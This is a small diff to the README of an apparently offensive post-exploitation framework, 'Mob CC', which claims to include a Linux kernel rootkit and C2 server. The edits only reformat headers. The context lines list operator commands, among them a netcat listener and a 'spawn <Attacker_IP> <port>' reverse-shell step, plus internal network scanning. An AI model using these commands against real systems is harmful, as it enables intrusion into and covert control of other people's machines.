@@ -32,7 +32,7 @@ Mob CC is a post exploitation framework containing a Linux kernel rootkit, C2 se
 
 ---
 
-# Help
+# Help:
   - To spawn a new shell from different device. eg:'nc -lvnp &lt;port&gt;' | 'spawn &lt;Attacker_IP&gt; &lt;port&gt;'
   - To scan the internal network from the target system. 'scan'
   - To kill the connection (reverse shell process) type. 'kill -9 &lt;pid&gt;'
@@ -42,6 +42,5 @@ Mob CC is a post exploitation framework containing a Linux kernel rootkit, C2 se
 ---
 
 
-Resources:
-
+# Resources:
 Learn how to create Linux Kernel modules: https://xcellerator.github.io/posts/linux_rootkits_01/
